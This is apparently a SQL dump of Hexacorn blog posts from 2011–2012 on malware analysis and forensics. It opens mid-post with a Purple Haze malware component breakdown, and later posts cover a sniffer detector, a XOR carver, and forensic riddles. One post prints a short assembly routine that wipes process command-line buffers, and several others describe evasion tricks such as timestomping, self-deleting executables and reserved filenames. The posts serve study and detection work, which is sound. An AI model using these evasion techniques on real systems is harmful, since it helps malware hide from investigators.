original \\WINDOWS\\system32\\spoolsv.exe\r\n [x] moves file\r\n      src: \\\\?\\globalroot\\Device\\HarddiskVolume1\\WINDOWS\\system32\\spoolsv.exe\r\n      dst: C:\\WINDOWS\\TEMP\\4.tmp, flags=\r\n [x] marks file C:\\WINDOWS\\TEMP\\4.tmp (\\WINDOWS\\system32\\spoolsv.exe) for deletion\r\n     HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager\\PendingFileRenameOperations\r\n\r\nso, \\WINDOWS\\system32\\spoolsv.exe is moved to 4.tmp, marked for deletion,\nbut will reappear after the reboot\n\nQUICK STATIC ANALYSIS OF COMPONENTS\nOkay, once we looked at the file and its execution flow, it’s time to poke around to see what stuff is actually hidden inside the embedded files. Extracting the files is not too difficult and we can see that there is a bunch of them actually:\nComponents\r\n\r\nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_ph.dll\r\nSize        28704\r\nMD5         B0BB987BB74664F4DFB4154EED5406B1\r\nSHA1        A7AF591015D8C1959EF0CD692372E39BD4AB4994\r\nFUZZY       768:EvHSw/VoWy9bEUPoUy1BS9YOshh1pXSVSDgmY:EPSw/VdqEUP2Zhh1piR,\"____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_ph.dll\"\r\nEntropy     6.29082900424848\r\nType        MZ PE i386 DLL\r\nCompiled    2012-01-18 23:33:08 (Wednesday)\r\n\r\nThe ad clicking module, interesting string:\n%[^.].%[^(](%[^)])\r\nPurpleHaze\r\nph|%s|%s|%s|%s\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\nCache-Control: must-revalidate, no-cache, no-store\r\nPragma: no-cache\r\nExpires: Sat, 01 Jan 2000 00:00:00 GMT\r\nConnection: close\r\n<body><a id=link href=\'%s\'></body>\r\n<script>document.getElementById(\'link\').click()</script>\r\nphdata\r\nsvchost.exe\r\nnetsvcs\r\nGlobal\r\njava.exe\r\njp2launcher.exe\r\nacrord32.exe\r\n%d.%d.%d_%d.%d_%d\r\nS:(ML;;NW;;;LW)\r\n%s.dll\r\nkernelbase\r\nhttp://%s%s\r\n http/1.\r\nhost:\nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phd\r\nSize        32288\r\nMD5         970EFB57CBB4962B6A74D94CD22BCA63\r\nSHA1        06049082C9B367A2A0BADAE077D7F9527C5D2690\r\nFUZZY       768:B6Ad2SmKTyScPlv75iXeeH6OMRrUfsi7fIhEl7UaAxPWaOlXuVI:B6Ad2GTolD5/NEnf72BxPWaGu+,\r\n            \"____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phd\"\r\nEntropy     7.30737347784811\r\nType        MZ PE i386 SYS DLL\r\nCompiled    2012-01-23 12:07:36 (Monday) \r\n\r\nKernel driver\r\n\r\nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phdata\r\nConfig file\r\n[PurpleHaze]\r\npn=161\r\nall=ph.dll\r\nallx=phx.dll\r\nwait=3600  \nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phdx \r\nSize        22048\r\nMD5         66EB89E848C036C5755406E871947700\r\nSHA1        2AFD2AF269C620BDD5041ED0D3EE47502E3ACA4F\r\nFUZZY       384:wcMGOJ+SOnSGQu8l6PtjVaglZSo7uvyt1/2j9tLvA+EDgS+DBcG2ATbWY0b:wcMuJnEu8l6VjggbSuM9ZvBEDgXD2GhU,\r\n            \"____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phdx\"\r\nEntropy     6.07370244368794\r\nType        MZ PE AMD64 Kernel driver for AMD64bit  \nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phld \r\nBinary file \nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phln \r\nSize        3174\r\nMD5         3B39D436107BAC7B0A62465BA9150EFF\r\nSHA1        40FE02BE9F35135C1102A26B1F5A502C80DB7457\r\nFUZZY       48:MCB01djg5hZ+t3ICFnX4xfQAgCvq9zk+VhF6s6a1JQlI:3Ug5hm3toxISq9F30I,\r\n            \"____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phln\"\r\nEntropy     5.42879880799889\r\nType        MZ PE i386 SYS DLL\r\nCompiled    2012-01-18 23:31:34 (Wednesday) \r\n\r\nKernel driver  \n\nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phlx\r\nSize        3688\r\nMD5         42223C735194A70B1EBCA70DB0EDE2C1\r\nSHA1        52A7D5AFA5FF6663CC80F1CAAAFCFCEA8394C1E7\r\nFUZZY       48:pFkZdjymAezwDtpHH3UfcuZ3X1eD9AoizmBOsTmHtuZCzF5qzyCd8vw6XO:IymAIV8WeTcmzNXD,\r\n            \"____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phlx\"\r\nEntropy     5.29079091610341\r\nType        MZ PE AMD64 \r\n\r\nKernel driver for AMD64bit\nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phs \nBinary file; contains strings:\r\n            phdata ;   [PurpleHaze]\r\n            pn=161\r\n\r\nName        ____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phx.dll \r\nSize        3104\r\nMD5         9B82A980F6DFBB0124D7C765F8A7F7C2\r\nSHA1        083E31FC72FAAD085612374D90AF46CD5AAABB06\r\nFUZZY       24:eFGSY85CW06GdUZSEdRXIQum+aUDtXAR9RWgUXdf4iE//4Cjbh45pxZ3:iY8g6GdnIRXnJTEtXATMgUeiEH4CPq,\r\n            \"____globalroot_device_00000d83_{7bd8ce81-2e78-3820-e33d-255a2feb1937}_phx.dll\"\r\nEntropy     2.76585363725654\r\nEntropy2    0.686573878169023\r\nType        MZ PE AMD64 Portable executable 64 bit for AMD \n Name        _TEMP__1.tmp \r\nSize        130592\r\nMD5         7BD5F8C04051276C0078EBA3F28004D5\r\nSHA1        608DC2C2B1549AF8EAC7B8FD12F875029CA84700\r\nFUZZY       3072:Bkt+9iOinX6OunNa8ad76Jw+0HGdsZ7nncCH6/CH2:Bd8X6/Xad76J0GdkLLH,\r\n            \"_TEMP__1.tmp\"\r\nEntropy     7.72253522274673\r\nType        MZ PE i386 DEB\r\nCompiled    2011-06-04 11:45:38 (Saturday)\r\n\r\n Name        c__WINDOWS_Temp_2.tmp \r\nSize        32288\r\nMD5         970EFB57CBB4962B6A74D94CD22BCA63\r\nSHA1        06049082C9B367A2A0BADAE077D7F9527C5D2690\r\nFUZZY       768:B6Ad2SmKTyScPlv75iXeeH6OMRrUfsi7fIhEl7UaAxPWaOlXuVI:B6Ad2GTolD5/NEnf72BxPWaGu+,\r\n            \"c__WINDOWS_Temp_2.tmp\"\r\nEntropy     7.30737347784811\r\nType        MZ PE i386 SYS DLL DEB\r\nCompiled    2012-01-23 12:07:36 (Monday)\r\n\r\nKernel driver\n\nTHAT’S ALL FOR NOW\nIt would seem that the main dropper is an old piece from June 2011, and modules have been recompiled in January 2012.\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/02/13/purple-haze-analysis/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (393, 'Permanent Link to Purple Haze – Anti-forensics and anti-detection', 'Hexacorn', 'February 13, 2012 ', 'Purple Haze is a new malware that is similar to TDL. I recently got a sample from an excellent malware analysis/reversing forum kernelmode.info and had a quick look at the code (goodbye my weekend :)).\nThe code is actually very interesting and some parts of it have been already covered by ESET’s blog. What caught my attention from a forensics perspective though was that one of the modules malware uses (ad clicker component I presume) is relying on a simple anti-forensics code to clean up the cache:\n\nIt also patches the waveOutOpen function to prevent the clicker from making sounds – simple, yet effective way to avoid detection.\nI will post bits and bobs about other findings soon.\nShare this :)', 'Anti-Forensics, Malware Analysis', 'http://www.hexacorn.com/blog/2012/02/13/purple-haze-anti-forensics-and-andi-detection/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (394, 'Permanent Link to Automation vs. In-depth Malware Analysis – practically', 'Hexacorn', 'February 9, 2012 ', 'You don’t need to read it if you are an experienced reverse engineer. You have been warned \nIn my old post about Automation vs. In-depth Malware Analysis I mentioned that dynamic analysis has its limitation. Just talking about this is not good enough though and I always wanted to provide some real-case example to back it up.\nToday I came across a post from  Webroot written by Dancho Danchev; the post is talking about two client-side exploits serving malware campaigns. Since the blog entry provided the IP of a malicious web site, I visited it immediately to… well… get my test box infected \nThe web site is serving blackhole exploit pack, and while it is an interesting subject for malware analysis, I was hoping more to find something to look at inside the payload – it’s good to see what happens to the system after it actually gets exploited by the latest badness. I didn’t need to wait long, the payload arrived pretty much right after I visited the malicious web site using old IE 6.0 (it’s very handy for exercises like this :))\nThe web page shows familiar BlackHole exploit loading screen:\n\nIn a background, browser is being served various exploits and once page started loading, I immediately spotted a piece of malware running happily from my Application Data folder.\n\nI collected the piece from the sandbox (together with its dropper that was actually dropped and executed by an exploit pack, but then quickly stopped is execution) and loaded the code of  a payload dumped from memory into IDA. The code turned out to be a typical malware stuff (downloads&executes stuff from remote site), so not much to say about it really. What I spotted though is that there were two code branches inside WinMain that are dependent on the command line argument. And this gave me an idea to follow up on my old post.\nTurns out the malicious .exe accepts two different command line arguments ‘a’ and ‘s’:\n\nOne code branch is for a regular win32 application, and one for a service process started via StartServiceCtrlDispatcherW.\n\nNot only the service process executable may be relying on command line arguments that are hard to guess, but it also needs to be handled differently – one can’t just execute service process from a command line or explorer and observe its behaviour (service needs to be created first, then started e.g. via sc.exe;  attempting to run a service process from a command line will bring ERROR_FAILED_SERVICE_CONTROLLER_CONNECT error).\nSee how typical ‘service process’ testing would fail if command line ‘s’ argument is not provided, and what happens when the correct argument is actually there:\n\nNote one more time that I have been communicating with the malicious .exe via sc.exe program, and not running it directly from a command line (this is how most of the dynamic analysis kick off).\nIn other words, dynamic analysis has a long way to go ‘to cover all angles’ i.e. manual code inspection and analyzing the code using a good disassembler as you walk through code with a debugger and/or other helper software is the best way to fully understand what’s going on.\nShare this :)', 'Malware Analysis, Preaching', 'http://www.hexacorn.com/blog/2012/02/09/automation-vs-in-depth-malware-analysis-practically/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (395, 'Permanent Link to Forensic Riddle #9d – Answer', 'Hexacorn', 'February 7, 2012 ', 'Windows Explorer uses desktop.ini files to customize the look and feel of each individual folder. Apart from icon, or image, it is also possible to modify the folder’s name by replacing it with a name specified inside the desktop.ini file. The new name can be either a string inside a DLL, or a less-known mapping via LocalizedResourceName registry key (works at least for XP).\nSee screenshot for details:\n\nOnce I created one folder like this, I copied it multiple times and in the end created the folder full of ‘Riddles’:\n\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/02/07/forensic-riddle-9d-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (396, 'Permanent Link to Process “Timestomping”', 'Hexacorn', 'February 7, 2012 ', 'This post is about thing so obvious that you will probably scratch your head why I am even writing about it. I think it is good to confirm your assumptions, test (and sometimes double test) stuff and I just happened to do it today, so since I have already done the homework, I thought it would be good to at least mention it just in case someone doesn’t know about it. So, you have been warned \nNow, for the obvious part.\nFile timestomping is a well-known process of modifying timestamps of a file in order to hide its presence by ‘blending’ with the legitimate files.\nTimestomping can be also applied to processes – malware can temporarily change the current date/time before it runs a hijacked process e.g. iexplore.exe, svchost.exe. Interestingly (but not surprisingly), the resulting process creation timestamp will be preserved by the system and tools retrieving this data, both live and offline memory analysis tools will all show the timestomped value.\nIn an example presented below, I changed the date on the system to 2008/1/1 and executed notepad.exe.\nBoth Process Explorer, and tools I used on an acquired memory dump (memoryze, volatility and red line) shown the timestomped process creation timestamp.\n\nShare this :)', 'Anti-Forensics, Compromise Detection, Malware Analysis', 'http://www.hexacorn.com/blog/2012/02/07/process-timestomping/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (397, 'Permanent Link to Detecting sniffers with HSD', 'Hexacorn', 'February 5, 2012 ', 'I am aware of two command line tools available ‘on the market’ that are free and can be used to detect sniffers: \n\npromiscdetect.exe by Arne Vidstrom from ntsecurity.nu\npromqry.exe from Microsoft.\n\nThe first one i.e. promiscdetect.exe detects promiscuous mode of network cards by enumerating the entries that can be found under the following Registry key:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards\nIt does not ‘see’ all devices/interfaces.\nThe second tool is better – promqry.exe ‘sees’ all interfaces yet the tool requires .NET and is quite slow. It is understandable, because it is a .NET application and it ‘talks’ to WMI to retrieve the information it needs.\nThe very same concept that is used by promqry.exe can be implemented with a simple vbs script e.g.:\n\nSet wmi = GetObject(\"winmgmts:\\\\.\\root\\WMI\")\nSet items = wmi.ExecQuery(\"SELECT * FROM MSNdis_CurrentPacketFilter\", \"WQL\", 48)\nFor Each oneitem In items\nif (oneitem.NdisCurrentPacketFilter And 32) then\nWScript.Echo \"InstanceName: \" & oneitem.InstanceName\nWScript.Echo \"Promiscuous mode detected!\"\nend if\nNext\n\nYou can then run such script with cscript.exe or wscript.exe.\nUsing wrappers is nice and easy, yet not everyone wants to run commands that may in the end trigger execution of other applications/services, and/or create extra Prefetch files, especially during volatile data acquisition.\nRemoving the wrappers and talking directly to devices to get their status on promiscuous mode is quite simple. As mentioned, what both .NET or VBS scripts really do is talking directly to WMI. Conceptually WMI must find the device names for each of the interfaces and send them some status requests, but well, who knows what is really going on under the hood there.\nLuckily, many people have researched it before and we can assume that at some stage the enumerated devices are being sent a IOCTL_NDIS_QUERY_GLOBAL_STATS/OID_GEN_CURRENT_PACKET_FILTER request via DeviceIoControl API. If the returned value has a NDIS_PACKET_TYPE_PROMISCUOUS (0x20) bit on, it means the promiscuous mode for this particular device is enabled. Yes, it is that simple. While Microsoft says ‘This IOCTL will be deprecated in later operating system releases. You should use WMI interfaces to query miniport driver information. For more information see, NDIS Support for WMI.’, I don’t see any reason why we shouldn’t be using it until they actually do \nSo, how can we enumerate all interfaces?\nWe can certainly talk to devices listed under the NetworkCards key:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards\nWe can also talk to network devices listed under the following key:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}\nas explained 8 years ago here.\nAnd this is precisely what Hexacorn Sniffer Detector (HSD) does. It is written in x86 asm, so it’s pretty small. It ‘encapsulates’ the functionality of promiscdetect.exe and promqry.exe as well as the technique described on SecurityFriday page.\nYes, it is slightly overengineered solution as the same device can be requested for status twice, but at least we have a certainty nothing is missed \nTo avoid noise, HSD reports only these devices that are in a promiscuous mode.\nLast, but not least, there are other methods to enumerate interfaces – one can use GetIfTable/GetIfTable2/GetIfTableExAPI APIs. The problem is that the first one doesn’t enumerate all devices and the other ones are available on Vista+ only, so enumerating registry entries sounds like the best deal at the moment.\nWhen you run HSD on a clean system, you should see something like this:\n\nAnd with the active sniffer, you you should see the something along these lines:\n\nYou can download HSD here\nPlease let me know if you encounter any issues.\nShare this :)', 'Compromise Detection, HSD, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/02/05/detecting-sniffers-with-hsd/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (398, 'Permanent Link to Forensic Riddle #9d', 'Hexacorn', 'February 5, 2012 ', 'This is the 4th and the last time :). Until I come up, or find out (send me your ideas!) about other ways of doing so.\nQuestion is the same: what happened here?\n\nNo malware\nNo Unicode\nNo case-sensitive file-names\nNo blank characters\n\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/02/05/forensic-riddle-9d/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (399, 'Permanent Link to Forensic Riddle #9c – Answer', 'Hexacorn', 'February 5, 2012 ', 'The answer may surprise you (or not). It’s just a matter of adding extra blank character at the end of the second ‘Riddle’ directory i.e. these are ‘Riddle’ and ‘Riddle ‘ directories respectively. Obviously, not very visible on the UI.\nAs usual, one needs to bypass CreateDirectoryA/W and use native APIs directly (otherwise extra blank characters/spaces/ will be trimmed before the buffer is passed to native APIs and the call will fail).\n \nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/02/05/forensic-riddle-9c-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (400, 'Permanent Link to Forensic Riddle #9c', 'Hexacorn', 'February 1, 2012 ', 'This is the 3rd time \nQuestion is the same: what happened here? No malware, no Unicode, no case-sensitive file-names:\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/02/01/forensic-riddle-9c/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (401, 'Permanent Link to Forensic Riddle #9b – Answer', 'Hexacorn', 'January 29, 2012 ', 'NTFS file system is by design case-sensitive, yet this option is disabled by default.\nOne needs to change the following option in Registry:\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel]\n\"obcaseinsensitive\"=dword:00000001\nand restart the system to be able to create files and directories that are case-sensitive.\nNotably, Windows APIs e.g. CreateDirectoryA/W are mapped to NtCreateFile API with OBJ_CASE_INSENSITIVE flag on, so they can’t be used to create case-sensitive files/directories.\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/01/29/forensic-riddle-9b-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (402, 'Permanent Link to Forensic Riddle #9b', 'Hexacorn', 'January 26, 2012 ', 'This is a second part of the riddle – this time there is no Unicode characters, no GUI attacks, nothing malicious.\nQuestion: What happened here?\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/01/26/forensic-riddle-9b/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (403, 'Permanent Link to Forensic Riddle #9a – Answer', 'Hexacorn', 'January 24, 2012 ', 'There are many answers here and the very same result could be achieved in many ways:\n\nUnicode/homomorph attack\n\nusing Unicode characters e.g. from Russian alphabet; this can be usually easily detected from a command line level:\n\n\nGUI attack\n\nit is relatively easy to modify the content of any other window, including windows used by Explorer to display file names (window class is a standard ‘SysListView32′); some malware use GUI attacks to remove their processes’ names from a list of processes shown by Task Manager\n\nAPI hooking\n\ntrivial to return two exact file names for two different entries\n\npatching the file system entry directly\n\nand probably a few more…\n \nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/01/24/forensic-riddle-9a-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (404, 'Permanent Link to The shortest anti-forensics code in the world', 'Hexacorn', 'January 21, 2012 ', 'Everyone knows about anti-forensics… from timestomping, secure deletions, wiping out internet history and event logs to monitoring I/O requests in order to provide fake data (e.g. original content of MBR sector) and Shadow Walker… there are some excellent presentations out there with the fantastic work of Bill Blunden from BH 2009 nicely wrapping it all up.\nMany of our IR/forensics activities rely on enumerating list of processes from an investigated system. The tools we use often show command line arguments of all processes. Process Explorer, Task Manager in Vista+ and command line tools e.g. tlist.exe or cmdline.exe show the content of processes’ command lines by copying the command line buffers directly from these processes’ address space.\nEnter the smallest anti-forensics code in the world.\nIt wipes out the content of the command line buffers stored under addresses returned by GetCommandLineA/GetCommandLineW. It takes 25 bytes of code.\n\nCleanupCMDLineArg:\r\ncall GetCommandLineA\r\ncall Cleanup\r\ncall GetCommandLineW\r\nCleanup:\r\ncld\r\nxchg eax,edi\r\nxor  eax,eax\r\nxor  ecx,ecx\r\ndec  cl\r\nrep  stosb\r\nretn\n\nOnce the code is ran, command line arguments are no longer visible in any of the aforementioned tools.\nI had a silly idea to demonstrate it by writing a command line arguments scroller for Task Manager and Process Explorer. The way I envisioned it would work is that I would be changing the content of buffers storing command line arguments of my process every second or so. The assumption was that anytime Task Manager or Process Explorer would refresh the list of the processes, they would copy the buffer containing my scrolled text and show it on their GUI. By manipulating the buffers I would be able to achieve the scrolling effect. Well, it didn’t work out as it seems the command line arguments are not updated anytime the process list is updated by these tools. A bug or a feature?\nShare this :)', 'Anti-Forensics', 'http://www.hexacorn.com/blog/2012/01/21/the-shortest-anti-forensics-code-in-the-world/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (405, 'Permanent Link to Forensic Riddle #9a', 'Hexacorn', 'January 21, 2012 ', 'This is a riddle with multiple answers – some are super trivial, some are probably not and actually raise interesting questions about Windows. We will explore some of them one by one.\nQuestion: What happened here?\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/01/21/forensic-riddle-9a/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (406, 'Permanent Link to Forensic Riddle #8 – Answer', 'Hexacorn', 'January 15, 2012 ', 'There is a less known LoadModule API from kernel32.dll that can be used to launch applications the same way as WinExec and others.\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/01/15/forensic-riddle-8-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (407, 'Permanent Link to Forensic Riddle #8', 'Hexacorn', 'January 13, 2012 ', 'Malware is often using one of these 3 APIs to launch new processes:\n\nWinExec\nShellExecute (Ansi and Wide versions)\nCreateProcess (Ansi and Wide versions + all CreateProcess* family e.g. CreateProcessInternal, CreateProcessAsUser, etc.)\n\n \nQuestion:\nThere is at least one more API function that could be also used to launch executables. What is its name?\n \nHave a good weekend!\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/01/13/forensic-riddle-8/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (408, 'Permanent Link to DeXRAY – simple XORcarver', 'Hexacorn', 'January 5, 2012 ', 'It is a well-known fact that the most common encryption algorithm used by malware authors relies on an eXclusive OR (a.k.a. XOR) operation using a static, one byte long key. It is used so often that many researchers already have their own scripts and tools that attempt to cryptanalyse encrypted files and discover hidden data. And in case you don’t – you will now have one as well :-).\nDeXRAY\nDeXRAY is a simple perl script that tries to discover encrypted executables and DLLs (or, more generically – Portable Executables a.k.a. PE) within a given data file e.g. it could be an encrypted PE that is embedded inside a malicious dropper (including non-PE files e.g. PDFs) or network traffic.\nHow it works\nDeXRAY relies on a simple technique known as X-RAY. The technique is probably as old as an antivirus industry itself and relies on a simple fact that xoring two values from analyzed data will produce the same result as the result obtained from xoring these values if they have been previously encrypted with a static key.\nA xor B = (A xor key) xor (B xor key) = same value\nSince all Portable Executables start with letters ‘M’ and ‘Z’, xoring ‘M’ and ‘Z’ will produce the same value as xoring (‘M’ xor key) with (‘Z’ xor key)\n‘M’ xor ‘Z’ = (‘M’ xor key) xor (‘Z’ xor key) = 0x17\nIn other words, it is a known plain-text attack.\nSupported files\nDeXRAY attempts to decrypt\n\nAny binary file (using X-RAY)\nSymantec Quarantine files (VBN/QBD)\nMcAfee Quarantine files (BUP)\n\nQuarantine files are supported specifically for a very simple reason: they often rely on a XOR-based encryption algorithm and X-RAY is a very suitable technique to decrypt them. To make things easier, DeXRAY recognizes file extensions of known Quarantine files and uses (widely) known hard coded keys to decrypt these files while maintaining some flexibility in case some keys have changed.\nUsage:\nperl DeXRAY.pl <filename or directory>\nWhat is the output?\nIf it works, you will get files saved as <original filename.XXXXXXXX.YY.out>\nwhere:\n\nXXXXXXXX is the offset (hexadecimal) where the file starts in the original file\nYY is the encryption key (hexadecimal)\n\nThere may be more files than one. In some cases the log from the script may show two output files with the same name (one obtained from de-xoring with a hard coded value and second one from X-RAY; in such case, only one file is produced).\nExamples and Notes\n\nSymantec Quarantine files (.VBN) – xor 0x5A\n\nDeXRAY won’t work with some Symantec Quarantine files. As far as I can tell, it is because not all VBN files are actualy encrypted, so it’s worth looking at a hex dump of such files first. It may also not work if the Quarantined file is not Portable Executable – X-RAY only supports Portable Executable. Adding support for other files (e.g. Flash, PDF) is trivial. Finally, note that there are often two VBN files associated with one Quarantine entry – one contains some metadata, second is the actual encrypted file and is located in a Quarantine subdirectory named similarly to the first VBN file.\nThe content of the decryptable VBN file is metadata at the top of the file (clear text and strings visible, but header format is unknown) that is followed by the encrypted content we want to grab. One more note here – the location of the encrypted data within the VBN file is not static as some blogs suggest. DeXRAY script is trying to ‘guess’ the offset to the encrypted by reading first 32-bit value from the file (while it is not documented, it appears to be actually pointing to the encrypted content).\n\n\nSymantec/Norton Quarantine files (.QBD) – xor 0xB3 / xor 0x4C\n\nDeXRAY decrypts the whole file using static key 0xB3. This allows to decrypt the metadata at the top of the file. It then uses X-RAY and finds the encrypted malware (it’s encrypted with the key 0x4C)\n\n\nMcAfee Quarantine (.BUP) – xor 0x6A\n\nDeXRAY decrypts the whole file using static key 0x6A. This allows to decrypt the metadata at the top of the file. It then relies on X-RAY to find and extract the encrypted malware\n\n\nonly PE files are supported by X-RAY, but adding support for known malicious files is trivial and you could add it yourself, or drop me a line and I will add it.\n\nI am not sure if all static keys are always correct as I didn’t have enough samples to test, but it seemed to work in all tests. If you come across files that you know for sure they should be containing malware and DeXRAY fails to decrypt them, feel free to send them over and I will have a look.\nDownload\n\nDeXRAY.pl\n\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2012/01/05/dexray-simple-xorcarver/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (409, 'Permanent Link to Forensic Riddle #7 – Answer', 'Hexacorn', 'January 2, 2012 ', 'The answer is pretty straightforward to anybody who is a programmer. Registry is just a configuration data that is read at some stage. The way the configuration affects OS or application (or DLL) depends on whether it has been read during the system-wide initialization (one off initialization that sets some flags only once after system restart), process/module-specific initialization (that is a one-off for a specific process or module), or is read anytime certain function is executed (thus, changing registry has an immediate effect).\nIt’s 2012 and time for something new, so I am suspending riddles for the time being. I still have a few more to post, yet from now on it won’t be that frequently.\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/01/02/forensic-riddle-7-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (410, 'Permanent Link to Forensic Riddle #7', 'Hexacorn', 'December 30, 2011 ', 'Many Microsoft articles say that modifying certain registry keys require computer to be restarted for the changes to be taken into account.\nQuestion: Why? And why sometimes these changes are taken into account immediately (i.e. without restart)?\nHave a good weekend and Happy New Year 2012!\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/12/30/forenisc-riddle-7/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (411, 'Permanent Link to Forensic Riddle #6 – Answer', 'Hexacorn', 'December 26, 2011 ', 'Yes. It is. One way to do it is to save its own copy as an ADS (Alternate Data Stream) and run it from there. Once executed from ADS, the host file will be able to self-delete itself. So, technically it is a bit of cheating :), yet it works – see the screenshot for details.\n\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2011/12/26/forensic-riddle-6-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (412, 'Permanent Link to Forensic Riddle #6', 'Hexacorn', 'December 23, 2011 ', 'Many malware authors use external .bat/.cmd files to delete the .exe dropper, because it is non-trivial to self-delete while the malware is still running. In the past it was possible to use Gary Nebbett’s famous self-deleting executable trick and it worked for Windows NT and Windows 2000. However, it doesn’t work under newer versions of Windows.\nQuestion:\nIs it possible to create a self-deleting executable for newer version of Windows?\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/12/23/forensic-riddle-6/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (413, 'Permanent Link to Forensic Riddle #5 – Answer', 'Hexacorn', 'December 19, 2011 ', 'The files with reserved names can be created using a path specified by using ‘\\\\.\\’ notation e.g. ‘\\\\.\\c:\\riddle\\con’. You can read more here.\n\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2011/12/19/forensic-riddle-5-answer-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (414, 'Permanent Link to Forensic Riddle #5', 'Hexacorn', 'December 15, 2011 ', 'Normally it is impossible to create files with names reserved for old DOS device drivers e.g. ‘con’, ‘lpt1’, ‘lpt2’, etc., yet some malware still manages to create them.\nHow?\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/12/15/forensic-riddle-5/\n');
